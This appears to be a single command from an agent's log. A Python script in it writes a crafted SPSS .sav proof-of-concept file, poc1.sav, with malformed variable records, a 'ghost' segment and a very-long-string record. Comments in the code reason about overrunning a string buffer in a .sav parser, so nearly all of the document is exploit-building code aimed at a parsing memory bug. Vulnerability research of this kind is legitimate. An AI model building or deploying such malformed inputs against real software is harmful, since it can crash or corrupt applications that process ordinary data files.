Command `cd /workspace && python3 - <<'PY'
import struct, pathlib
p=pathlib.Path('/workspace/poc1.sav')
header=struct.pack('<4s60siiii d 9s8s64s3s',b'$FL2',b'@(#) IBM SPSS STATISTICS'.ljust(60,b' '),2,1,0,0,1,100.0,b'01 JAN 24',b'00:00:00',b''.ljust(64,b' '),b'   ')
print(len(header))
out=bytearray(header)
i=lambda x: struct.pack('<i',x)
# base variable type=255 so width initially? type >0 -> string, width=1; then add 31 blank -1 records => width 32, var_offset 32
out += i(2)+struct.pack('<iiiii8s',255,0,0,0x00ff0100,0x00ff0100,b'V1      ')
for k in range(31):
    out += i(2)+struct.pack('<iiiii8s',-1,0,0,0,0,b'        ')
# add ghost second segment type 1 to have varinfo[32? wait blank not separate entries, only increments width not var_index. ghost var positive -> var_index 2, var_offset 33
out += i(2)+struct.pack('<iiiii8s',1,0,0,0x00010100,0x00010100,b'V1_A    ')
# integer info
out += i(7)+i(3)+i(4)+i(8)+struct.pack('<iiiiiiii',20,0,0,-1,1,0,2,65001)
# very long length just 253 gives n_segments=2; but base col width 32 means after 32 chunks raw_used 256 then decrement etc. raw_string_len 260 so copies stop at 256, decrements not under. Need many segments maybe 40 with all widths 32, raw used reaches cap then decrement 39 times until maybe no under. Need length huge? raw len length+7 also grows.
v=b'V1=253'
out += i(7)+i(14)+i(1)+i(len(v))+v
out += i(999)+i(0)
out += b'A'*(33*8)
p.write_bytes(out)
print(len(out), p)
